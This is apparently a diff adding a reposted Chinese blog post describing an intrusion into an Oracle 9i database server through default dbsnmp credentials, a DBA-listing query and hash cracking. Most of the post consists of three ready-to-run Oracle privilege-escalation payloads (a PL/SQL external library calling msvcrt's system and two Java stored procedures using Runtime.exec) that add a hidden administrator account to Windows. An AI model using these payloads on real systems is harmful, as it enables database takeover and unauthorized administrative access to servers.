@@ -1,0 +1,127 @@
+
+呵呵，今天学校一哥们儿找到我说是有十万火急的事，原来是他的地盘被别人“非法闯入”了，
+于是去他的网站看了一下，没发现什么能够可以利用的漏洞，并且后台也被他删了，
+呵呵，正当我在嘲笑他，是人品的问题时，
+
+随手用流光扫了一下端口，发现数据库是ORACLE（开了1521端口），
+于是打开
+监听器LSNRCTL,然后
+set current_listener IP连了一下，
+用version命令看了一下，竟然是oracle 9i,
+遂继续看了一下服务，很顺利，没有验证，直接拿到服务名，
+这时我才恍然大悟，“入侵者”可能是这样搞定网站的，
+
+直接打开SQLPlus,敲入connect dbsnmp/dbsnmp@服务名，竟然连上了，
+用select distinct a.name from sys.user$ a,sys.sysauth$ b where a.user#=b.grantee# and b.privilege#=4;
+
+看了一下DBA，天哪，帐户密码竟然一样，这样就可以通过ORACLE来执行OS命令，进而拿下操作系统，
+随手连了一下3389，竟然是win2003，
+
+至此，问题的根源已经找到，oracle 下默认帐户密码没有修改，而且最要命的就是那个dbsnmp账户，特别是对于oracle 9i，
+安装时是不提示修改默认密码的，他虽然不是DBA，但却可以通过它看道很多要命的信息，
+sys，system的hash可以轻松得到，这样随便找个彩虹表，很快就可以搞定hash，
+进而拿下最高权限！接下来，才是重头戏，利用oracle提权，总的来说，常用的有这几种方法：
+
+1.通过PL/SQL运行OS命令
+
+CREATE OR REPLACE LIBRARY 
+exec_shell AS 'c:\windows\system32\msvcrt.dll';
+/
+CREATE OR REPLACE PACKAGE oracmd IS PROCEDURE exec(cmdstring IN CHAR);
+end oracmd;
+/
+CREATE OR REPLACE PACKAGE BODY oracmd IS 
+PROCEDURE exec(cmdstring IN CHAR)
+IS EXTERNAL 
+NAME "system" 
+LIBRARY exec_shell
+LANGUAGE C;
+end oracmd;
+/
+exec oracmd.exec('net user FIGJAM 123 /add');
+exec oracmd.exec('net localgroup administrators FIGJAM /add');
+
+2.通过Java运行OS命令
+
+CREATE OR REPLACE AND RESOLVE JAVA SOURCE NAMED "JAVACMD" AS
+import java.lang.*;
+import java.io.*;
+public class JAVACMD
+{
+public static void execCommand (String command) throws IOException
+{
+Runtime.getRuntime().exec(command);
+}
+};
+/
+CREATE OR REPLACE PROCEDURE JAVACMDPROC (p_command IN VARCHAR2)
+AS LANGUAGE JAVA
+NAME 'JAVACMD.execCommand (java.lang.String)';
+/
+exec javacmdproc('cmd.exe /c net user FIGJAM 123 /add');
+exec javacmdproc('cmd.exe /c net localgroup administrators FIGJAM /add');
+
+3.Java提权
+
+create or replace and compile
+java source named "Util"
+as
+import java.io.*;
+import java.lang.*; 
+public class Util extends Object
+{
+public static int RunThis(String args)
+{
+Runtime rt = Runtime.getRuntime();
+int rc = -1; 
+try
+{
+Process p = rt.exec(args);
+int bufSize = 4096;
+BufferedInputStream bis =
+new BufferedInputStream(p.getInputStream(), bufSize);
+int len;
+byte buffer[] = new byte[bufSize];
+// Echo back what the program spit out
+while ((len = bis.read(buffer, 0, bufSize)) != -1)
+System.out.write(buffer, 0, len); 
+rc = p.waitFor();
+}
+catch (Exception e)
+{
+e.printStackTrace();
+rc = -1;
+}
+finally
+{
+return rc;
+}
+}
+}
+/
+create or replace
+function RUN_CMD(p_cmd in varchar2) return number
+as
+language java
+name 'Util.RunThis(java.lang.String) return integer';
+/
+create or replace procedure RC(p_cmd in varchar2)
+as
+x number;
+begin
+x := run_cmd(p_cmd);
+end;
+/
+variable x number;
+set serveroutput on
+exec dbms_java.set_output(100000);
+grant javasyspriv to 用户名
+/
+exec :x := RUN_CMD('net user FIGJAM /add');
+exec :x := RUN_CMD('net localgroup administrators FIGJAM /add');
+oracle的安全隐患无处不在！
+
+本文来自CSDN博客，转载请标明出处：http://blog.csdn.net/heiyoubei513/archive/2009/03/20/4009377.aspx
+本文来源于独自等待博客：http://www.waitalone.cn/ 原文地址：http://www.waitalone.cn/post/583.html 
+
+
